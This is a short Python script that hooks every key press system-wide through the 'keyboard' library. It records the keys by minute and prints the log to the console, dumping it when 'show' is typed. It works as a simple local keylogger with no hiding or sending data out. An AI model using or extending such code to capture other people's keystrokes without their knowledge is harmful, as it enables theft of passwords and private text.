
import keyboard
from datetime import datetime


dicti = {}

def on_key_press(key):
    global dicti
    key = str(key)[14:-6]
    currentTime = datetime.now().strftime('%d/%m/%y %H:%M')
    if currentTime not in dicti:
        dicti[currentTime] = ''
    dicti[currentTime] += key
    print(key)
    if "show" in dicti[currentTime]:
        for k,v in dicti.items():
            print(k)
            print(v)
        dicti = {}
keyboard.on_press(on_key_press)
keyboard.wait('Ctrl + Shift + .')



for k, v in dicti.items():
    print(k)
    print(v)
    print()